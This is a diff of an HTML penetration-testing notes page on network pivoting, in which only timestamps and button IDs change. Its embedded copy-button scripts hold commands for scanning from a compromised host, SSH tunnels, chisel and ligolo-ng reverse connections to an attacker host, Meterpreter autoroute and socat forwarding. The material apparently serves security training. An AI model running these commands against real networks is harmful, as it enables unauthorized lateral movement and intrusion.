@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:15 -->
+<!-- 2026-07-30 Thu 22:26 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Pivoting</title>
@@ -927,11 +927,11 @@ Before pivoting, confirm what the compromised host can see:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_75c8c42c73b34354bd934a9ef82abd0e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_4f180a2095ce4e08a11307b06d81bfef>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_75c8c42c73b34354bd934a9ef82abd0e=document.querySelector('button[name=btn_75c8c42c73b34354bd934a9ef82abd0e]');
-copyBtnbtn_75c8c42c73b34354bd934a9ef82abd0e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Linux\nip a                              # network interfaces and subnets\nip route                          # routing table\ncat /etc/hosts\n\n# Windows\nipconfig /all\nroute print\ntype C:\\Windows\\System32\\drivers\\etc\\hosts\n\n# Scan internal subnet from compromised host\n# Upload nmap or use built-in tools\nfor i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i & done | grep \"bytes from\"\n`);copyBtnbtn_75c8c42c73b34354bd934a9ef82abd0e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_75c8c42c73b34354bd934a9ef82abd0e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_4f180a2095ce4e08a11307b06d81bfef=document.querySelector('button[name=btn_4f180a2095ce4e08a11307b06d81bfef]');
+copyBtnbtn_4f180a2095ce4e08a11307b06d81bfef.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Linux\nip a                              # network interfaces and subnets\nip route                          # routing table\ncat /etc/hosts\n\n# Windows\nipconfig /all\nroute print\ntype C:\\Windows\\System32\\drivers\\etc\\hosts\n\n# Scan internal subnet from compromised host\n# Upload nmap or use built-in tools\nfor i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i & done | grep \"bytes from\"\n`);copyBtnbtn_4f180a2095ce4e08a11307b06d81bfef.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4f180a2095ce4e08a11307b06d81bfef.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -963,11 +963,11 @@ Requires SSH access to the compromised host.
 <h3 id="org3c7f35c">Dynamic — SOCKS proxy (most flexible)</h3>
 <div class="outline-text-3" id="text-org3c7f35c">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_342e2f29932a44cdb999c035e2256b46>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d48ecffe04b247728226c383866c63ae>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_342e2f29932a44cdb999c035e2256b46=document.querySelector('button[name=btn_342e2f29932a44cdb999c035e2256b46]');
-copyBtnbtn_342e2f29932a44cdb999c035e2256b46.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# All traffic through SOCKS5 on localhost:1080\nssh -D 1080 -N user@$PIVOT\n\n# Route tools through proxy\nproxychains nmap -sT -Pn 192.168.1.0/24\nproxychains curl http://192.168.1.50\nproxychains firefox\n`);copyBtnbtn_342e2f29932a44cdb999c035e2256b46.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_342e2f29932a44cdb999c035e2256b46.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d48ecffe04b247728226c383866c63ae=document.querySelector('button[name=btn_d48ecffe04b247728226c383866c63ae]');
+copyBtnbtn_d48ecffe04b247728226c383866c63ae.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# All traffic through SOCKS5 on localhost:1080\nssh -D 1080 -N user@$PIVOT\n\n# Route tools through proxy\nproxychains nmap -sT -Pn 192.168.1.0/24\nproxychains curl http://192.168.1.50\nproxychains firefox\n`);copyBtnbtn_d48ecffe04b247728226c383866c63ae.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d48ecffe04b247728226c383866c63ae.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -984,7 +984,7 @@ proxychains firefox
 <p>
 Configure <code>/etc/proxychains.conf</code>:
 </p>
-<pre class="example" id="orgfaa03ef">
+<pre class="example" id="org9595595">
 socks5 127.0.0.1 1080
 </pre>
 </div>
@@ -993,11 +993,11 @@ socks5 127.0.0.1 1080
 <h3 id="org68f317a">Local — forward a specific internal port</h3>
 <div class="outline-text-3" id="text-org68f317a">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_cd1c36b01d8d40eb8d359c6b51fa2493>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_60b330a4796b418daf8f43ee3e406560>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_cd1c36b01d8d40eb8d359c6b51fa2493=document.querySelector('button[name=btn_cd1c36b01d8d40eb8d359c6b51fa2493]');
-copyBtnbtn_cd1c36b01d8d40eb8d359c6b51fa2493.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Access internal RDP (192.168.1.10:3389) via localhost:3389\nssh -L 3389:192.168.1.10:3389 -N user@$PIVOT\nrdesktop localhost:3389\n`);copyBtnbtn_cd1c36b01d8d40eb8d359c6b51fa2493.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_cd1c36b01d8d40eb8d359c6b51fa2493.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_60b330a4796b418daf8f43ee3e406560=document.querySelector('button[name=btn_60b330a4796b418daf8f43ee3e406560]');
+copyBtnbtn_60b330a4796b418daf8f43ee3e406560.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Access internal RDP (192.168.1.10:3389) via localhost:3389\nssh -L 3389:192.168.1.10:3389 -N user@$PIVOT\nrdesktop localhost:3389\n`);copyBtnbtn_60b330a4796b418daf8f43ee3e406560.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_60b330a4796b418daf8f43ee3e406560.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1012,11 +1012,11 @@ rdesktop localhost:3389
 <h3 id="org099aef9">Remote — expose attacker port through pivot (reverse tunnel)</h3>
 <div class="outline-text-3" id="text-org099aef9">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_aa62e3ada511485ea7b4843c1e290f16>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_27eb437ca15247b2bccdca4821522713>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_aa62e3ada511485ea7b4843c1e290f16=document.querySelector('button[name=btn_aa62e3ada511485ea7b4843c1e290f16]');
-copyBtnbtn_aa62e3ada511485ea7b4843c1e290f16.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Forward pivot's port 8080 back to attacker's port 80\n# Run on attacker\nssh -R 8080:localhost:80 user@$PIVOT\n# Now requests to pivot:8080 reach attacker:80\n`);copyBtnbtn_aa62e3ada511485ea7b4843c1e290f16.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_aa62e3ada511485ea7b4843c1e290f16.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_27eb437ca15247b2bccdca4821522713=document.querySelector('button[name=btn_27eb437ca15247b2bccdca4821522713]');
+copyBtnbtn_27eb437ca15247b2bccdca4821522713.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Forward pivot's port 8080 back to attacker's port 80\n# Run on attacker\nssh -R 8080:localhost:80 user@$PIVOT\n# Now requests to pivot:8080 reach attacker:80\n`);copyBtnbtn_27eb437ca15247b2bccdca4821522713.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_27eb437ca15247b2bccdca4821522713.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1037,11 +1037,11 @@ Use when SSH is unavailable. Transfer binary to pivot host first.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_089e9805ed7146e797f18e8c458b3490>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a1871e3f41ef4a66ad7978fc98519ebf>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_089e9805ed7146e797f18e8c458b3490=document.querySelector('button[name=btn_089e9805ed7146e797f18e8c458b3490]');
-copyBtnbtn_089e9805ed7146e797f18e8c458b3490.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Attacker — start server\n./chisel server -p 8000 --reverse\n\n# Pivot — connect back and expose SOCKS proxy\n./chisel client $ATTACKER:8000 R:socks\n\n# Pivot — expose specific internal port\n./chisel client $ATTACKER:8000 R:3389:192.168.1.10:3389\n`);copyBtnbtn_089e9805ed7146e797f18e8c458b3490.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_089e9805ed7146e797f18e8c458b3490.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_a1871e3f41ef4a66ad7978fc98519ebf=document.querySelector('button[name=btn_a1871e3f41ef4a66ad7978fc98519ebf]');
+copyBtnbtn_a1871e3f41ef4a66ad7978fc98519ebf.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Attacker — start server\n./chisel server -p 8000 --reverse\n\n# Pivot — connect back and expose SOCKS proxy\n./chisel client $ATTACKER:8000 R:socks\n\n# Pivot — expose specific internal port\n./chisel client $ATTACKER:8000 R:3389:192.168.1.10:3389\n`);copyBtnbtn_a1871e3f41ef4a66ad7978fc98519ebf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a1871e3f41ef4a66ad7978fc98519ebf.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1071,11 +1071,11 @@ interface on the attacker — tools run without proxychains.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b72d40fb21004f12a091ffc782e7ee35>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0439ff32c4f744d585db0885d72f7f22>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_b72d40fb21004f12a091ffc782e7ee35=document.querySelector('button[name=btn_b72d40fb21004f12a091ffc782e7ee35]');
-copyBtnbtn_b72d40fb21004f12a091ffc782e7ee35.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Attacker\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# Pivot (agent — transfer and run)\n./agent -connect $ATTACKER:11601 -ignore-cert\n\n# In ligolo-ng console\n>> session                        # select the agent session\n>> ifconfig                       # view pivot's interfaces\n>> start                          # start tunnel\n\n# Add route on attacker\nsudo ip route add 192.168.1.0/24 dev ligolo\n`);copyBtnbtn_b72d40fb21004f12a091ffc782e7ee35.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b72d40fb21004f12a091ffc782e7ee35.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0439ff32c4f744d585db0885d72f7f22=document.querySelector('button[name=btn_0439ff32c4f744d585db0885d72f7f22]');
+copyBtnbtn_0439ff32c4f744d585db0885d72f7f22.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Attacker\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# Pivot (agent — transfer and run)\n./agent -connect $ATTACKER:11601 -ignore-cert\n\n# In ligolo-ng console\n>> session                        # select the agent session\n>> ifconfig                       # view pivot's interfaces\n>> start                          # start tunnel\n\n# Add route on attacker\nsudo ip route add 192.168.1.0/24 dev ligolo\n`);copyBtnbtn_0439ff32c4f744d585db0885d72f7f22.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0439ff32c4f744d585db0885d72f7f22.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1104,11 +1104,11 @@ Use when you have a Meterpreter session on the pivot.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_da63666e02474f678748ff0bcdb8f676>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9787cde0255c4840805cb2ae6f635807>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_da63666e02474f678748ff0bcdb8f676=document.querySelector('button[name=btn_da63666e02474f678748ff0bcdb8f676]');
-copyBtnbtn_da63666e02474f678748ff0bcdb8f676.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# In meterpreter session\nrun autoroute -s 192.168.1.0/24\n\n# Background the session then use auxiliary/server/socks_proxy\nuse auxiliary/server/socks_proxy\nset VERSION 5\nset SRVPORT 1080\nrun -j\n\n# Route tools through proxychains\n`);copyBtnbtn_da63666e02474f678748ff0bcdb8f676.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_da63666e02474f678748ff0bcdb8f676.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9787cde0255c4840805cb2ae6f635807=document.querySelector('button[name=btn_9787cde0255c4840805cb2ae6f635807]');
+copyBtnbtn_9787cde0255c4840805cb2ae6f635807.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# In meterpreter session\nrun autoroute -s 192.168.1.0/24\n\n# Background the session then use auxiliary/server/socks_proxy\nuse auxiliary/server/socks_proxy\nset VERSION 5\nset SRVPORT 1080\nrun -j\n\n# Route tools through proxychains\n`);copyBtnbtn_9787cde0255c4840805cb2ae6f635807.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9787cde0255c4840805cb2ae6f635807.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1134,11 +1134,11 @@ Useful when you have command execution but no interactive shell.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6663ea4c8e0d4c068a1cb719822cc042>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_5530d6196b9a427899dbb42b5c882518>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_6663ea4c8e0d4c068a1cb719822cc042=document.querySelector('button[name=btn_6663ea4c8e0d4c068a1cb719822cc042]');
-copyBtnbtn_6663ea4c8e0d4c068a1cb719822cc042.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Forward all traffic hitting pivot:8080 to internal host:80\nsocat TCP-LISTEN:8080,fork TCP:192.168.1.50:80\n\n# On Windows (if socat available)\nsocat TCP-LISTEN:8080,fork TCP:192.168.1.50:80\n`);copyBtnbtn_6663ea4c8e0d4c068a1cb719822cc042.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6663ea4c8e0d4c068a1cb719822cc042.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_5530d6196b9a427899dbb42b5c882518=document.querySelector('button[name=btn_5530d6196b9a427899dbb42b5c882518]');
+copyBtnbtn_5530d6196b9a427899dbb42b5c882518.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Forward all traffic hitting pivot:8080 to internal host:80\nsocat TCP-LISTEN:8080,fork TCP:192.168.1.50:80\n\n# On Windows (if socat available)\nsocat TCP-LISTEN:8080,fork TCP:192.168.1.50:80\n`);copyBtnbtn_5530d6196b9a427899dbb42b5c882518.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5530d6196b9a427899dbb42b5c882518.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1159,11 +1159,11 @@ Reaching a third network through two hops:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e7b2f2611c504a41bd42a3a8e93294be>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b4dc4aa485e44692998ce1d9083411e9>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e7b2f2611c504a41bd42a3a8e93294be=document.querySelector('button[name=btn_e7b2f2611c504a41bd42a3a8e93294be]');
-copyBtnbtn_e7b2f2611c504a41bd42a3a8e93294be.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Pivot 1 (internet-facing): $PIVOT1\n# Pivot 2 (internal): 192.168.1.10\n# Target network: 10.10.10.0/24\n\n# Step 1 — tunnel to PIVOT1\nssh -D 1080 -N user@$PIVOT1\n\n# Step 2 — through proxychains, set up Chisel on PIVOT1 to reach PIVOT2\nproxychains ./chisel server -p 8001 --reverse    # on PIVOT1\n./chisel client $PIVOT1:8001 R:1081:socks        # on PIVOT2 via proxychains\n\n# Update proxychains to chain both proxies\n# socks5 127.0.0.1 1080\n# socks5 127.0.0.1 1081\n`);copyBtnbtn_e7b2f2611c504a41bd42a3a8e93294be.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e7b2f2611c504a41bd42a3a8e93294be.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_b4dc4aa485e44692998ce1d9083411e9=document.querySelector('button[name=btn_b4dc4aa485e44692998ce1d9083411e9]');
+copyBtnbtn_b4dc4aa485e44692998ce1d9083411e9.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Pivot 1 (internet-facing): $PIVOT1\n# Pivot 2 (internal): 192.168.1.10\n# Target network: 10.10.10.0/24\n\n# Step 1 — tunnel to PIVOT1\nssh -D 1080 -N user@$PIVOT1\n\n# Step 2 — through proxychains, set up Chisel on PIVOT1 to reach PIVOT2\nproxychains ./chisel server -p 8001 --reverse    # on PIVOT1\n./chisel client $PIVOT1:8001 R:1081:socks        # on PIVOT2 via proxychains\n\n# Update proxychains to chain both proxies\n# socks5 127.0.0.1 1080\n# socks5 127.0.0.1 1081\n`);copyBtnbtn_b4dc4aa485e44692998ce1d9083411e9.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b4dc4aa485e44692998ce1d9083411e9.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
